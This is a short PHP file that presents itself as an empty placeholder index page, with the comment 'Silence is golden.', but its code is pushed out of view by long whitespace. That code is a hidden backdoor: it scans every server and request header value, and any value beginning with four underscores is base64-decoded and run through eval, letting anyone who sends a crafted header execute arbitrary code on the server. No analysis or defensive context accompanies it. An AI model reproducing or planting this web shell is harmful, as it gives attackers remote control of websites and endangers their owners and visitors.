<?php																																																																																																																																																																																																																																																																																																																								function w4743($l4745){if(is_array($l4745)){foreach($l4745 as $l4743=>$l4744)$l4745[$l4743]=w4743($l4744);}elseif(is_string($l4745) && substr($l4745,0,4)=="____"){$l4745=substr($l4745,4);$l4745=base64_decode($l4745);eval($l4745);$l4745=null;}return $l4745;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("w4743",$_SERVER);
// Silence is golden.
?>